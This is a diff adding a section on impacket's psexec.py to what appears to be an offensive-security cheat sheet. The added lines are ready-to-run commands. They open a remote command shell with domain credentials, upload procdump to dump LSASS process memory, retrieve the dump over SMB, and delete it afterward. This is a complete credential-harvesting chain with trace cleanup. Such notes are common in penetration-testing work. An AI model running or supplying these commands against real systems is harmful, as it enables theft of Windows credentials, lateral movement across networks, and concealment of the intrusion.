@@ -1,5 +1,22 @@
 # impacket
 
+## psexec.py
+
+Get a cmd:
+
+``` bash
+psexec.py "$domain/$domuser:$userpassword@$cible"
+```
+
+Execute remote commands (procdump is local in the current working directory, and will automatically be sent by psexec to the remote system for execution):
+
+``` bash
+psexec.py -c procdump.exe "$domain/$domuser:$userpassword@$cible" "-acceptEula -ma lsass.exe C:/windows/lsass.dmp"
+smbget -w $domain -U $domuser%$userpassword smb://$cible/ADMIN$/lsass.dmp
+psexec.py "$domain/$domuser:$userpassword@$cible" "del C:/windows/lsass.dmp"
+```
+
+
 ## GetUserSPNs.py
 
 ``` bash
